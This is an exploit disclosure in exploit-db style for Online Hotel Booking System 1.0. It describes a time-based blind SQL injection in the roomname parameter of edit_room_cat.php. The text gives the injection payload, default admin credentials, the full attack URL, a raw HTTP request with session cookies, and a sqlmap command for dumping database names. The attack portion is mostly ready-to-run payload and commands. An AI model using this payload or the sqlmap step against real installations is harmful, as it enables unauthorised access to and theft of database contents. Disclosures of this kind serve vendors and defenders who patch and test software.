# Online Hotel Booking System edit_room_cat.php id SQL inject

   
#### Exploit Title: Online Hotel Booking System edit_room_cat.php id SQL inject
#### Exploit Author: webraybtl@webray.com.cn inc
#### Vendor Homepage: https://projectworlds.in/free-projects/php-projects/2777-2/
#### Software Link: https://projectworlds.in/wp-content/uploads/2019/06/hotel-booking.zip
#### Version: Online Hotel Booking System 1.0
#### Tested on: Windows Server 2008 R2 Enterprise, Apache ,Mysql

#### Description
The reason for the SQL injection vulnerability is that the website application does not verify the validity of the data submitted by the user to the server (type, length, business parameter validity, etc.), and does not effectively filter the data input by the user with special characters , so that the user's input is directly brought into the database for execution, which exceeds the expected result of the original design of the SQL statement, resulting in a SQL injection vulnerability.Online Hotel Booking System does not filter the content correctly at the "edit_room_cat.php" id module, resulting in the generation of SQL injection.

#### Payload used:
`Duplex' AND (SELECT 1352 FROM (SELECT(SLEEP(5)))vGbz) AND 'zhFe'='zhFe`

#### Proof of Concept

1. Login the CMS. 
Admin Default Access:
Email: admin
Password: 12345

2. Open Page http://172.24.5.107/admin.php

3. Put SQL injection payload  (`http://172.24.5.107/admin/edit_room_cat.php?roomname=Duplex' AND (SELECT 1352 FROM (SELECT(SLEEP(5)))vGbz) AND 'zhFe'='zhFe`) in the id content and click on Enter to publish the page,Viewing the successfully sleep 5 seconds.
![image](https://user-images.githubusercontent.com/60683449/176632763-5e8e79be-b158-4b48-819e-5e20e446566d.png)

4. Html Request Code
```GET /admin/edit_room_cat.php?roomname=Duplex HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Cookie: PHPSESSID=i91fftap2j41ojamv49897fe27; ci_session=3eug5e2ddfbg0kf7vmme4m13g3n76evs
Host: 172.24.5.107
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) 
```
5. sqlmap data:
python3 sqlmap.py -r test.txt --dbs
![image](https://user-images.githubusercontent.com/60683449/176632778-25a1730f-f37b-4560-ac6b-45d3384ff00f.png)

